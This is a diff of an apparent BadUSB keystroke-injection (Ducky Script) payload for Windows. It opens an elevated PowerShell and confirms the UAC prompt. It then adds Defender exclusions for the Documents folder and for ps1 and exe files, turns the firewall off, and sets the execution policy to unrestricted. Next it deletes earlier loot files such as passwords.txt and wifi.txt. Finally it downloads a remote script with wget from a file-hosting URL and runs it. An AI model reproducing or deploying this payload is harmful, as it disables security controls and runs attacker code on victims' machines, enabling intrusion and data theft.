@@ -4,60 +4,101 @@ WINDOWS r
 DELAY 200
 STRING powershell Start-Process powershell -Verb runAs
 ENTER
-DELAY 3000
+DELAY 1000
 LEFTARROW
-DELAY 3000
+DELAY 1000
 ENTER
-DELAY 3000
+DELAY 1000
+REM Path exclude from defender
+STRING Set-MpPreference -ExclusionPath $env:systemdrive\users\$env:username\Documents
+DELAY 500
+ENTER
+DELAY 1000
+REM Disable Sound
+STRING Set-PSReadlineOption -BellStyle None
+DELAY 500
+ENTER
+DELAY 1000
+REM Disable Firewall
 STRING netsh advfirewall set allprofiles state off
-DELAY 3000
+DELAY 500
 ENTER
-REM Erlaube ps1-Dateien
+DELAY 1000
+REM Allow ps1-files
 STRING Add-MpPreference -ExclusionExtension ps1 -Force
-DELAY 3000
+DELAY 500
 ENTER
-REM Wir brauchen auch exe-Dateien
+DELAY 1000
+REM Allow executables
 STRING Add-MpPreference -ExclusionExtension exe -Force 
-DELAY 3000
+DELAY 500
 ENTER
-REM Wechsel das Verzeichnis
-STRING cd C:\Users\Public\Documents
-DELAY 3000
-ENTER
+DELAY 1000
 REM Disable script blocker
 STRING Set-ExecutionPolicy unrestricted -Force
-DELAY 3000
+DELAY 500
 ENTER
+DELAY 1000
+REM Install wget via winget
 STRING winget install wget
+DELAY 500
 ENTER
-DELAY 3000
+DELAY 10000
 STRING exit
 ENTER
-REM ---------------------------------------NEUE SESSION---------------------------------------------------------------
+DELAY 500
+REM ---------------------------------------NEW SESSION---------------------------------------------------------------
 WINDOWS r
-DELAY 200
+DELAY 500
 STRING powershell Start-Process powershell -Verb runAs
 ENTER
-DELAY 3000
+DELAY 1000
 LEFTARROW
-DELAY 3000
+DELAY 500
 ENTER
-DELAY 3000
-REM Wechsel das Verzeichnis
-STRING cd C:\Users\Public\Documents
-DELAY 3000
+DELAY 1000
+REM Change directory
+STRING cd  $env:systemdrive\users\$env:username\Documents
+REM Remove some files
+DELAY 500
 ENTER
-STRING del *
+DELAY 1000
+STRING del passwords.txt
+DELAY 500
 ENTER
-DELAY 3000
+DELAY 1000
+STRING del history.txt
+DELAY 500
+ENTER
+DELAY 1000
+STRING del wifi.txt
+DELAY 500
+ENTER
+DELAY 1000
+STRING del connected_devices.txt
+DELAY 500
+ENTER
+DELAY 1000
 STRING dir
+DELAY 500
 ENTER
-DELAY 3000
+DELAY 1000
+REM Get the ciaoV2.ps1. This file contain the downloads of necessary executables
 STRING wget https://6269eaad-964d-42c8-8cf4-ddfdfd2b54c2.usrfiles.com/ugd/6269ea_616966b9a6ea4c948b3f0c4865c4fe23.txt -O ciaoV2.ps1
-DELAY 3000
+DELAY 500
 ENTER
+DELAY 1000
+REM Start the ciaoV2.ps1
 STRING .\ciaoV2.ps1
+DELAY 500
 ENTER
-DELAY 3000
+DELAY 1000
+REM Show the directory
 STRING dir
+DELAY 500
 ENTER
+DELAY 1000
+STRING echo "*********** Player 1 READY *************"
+DELAY 500
+ENTER
+DELAY 1000
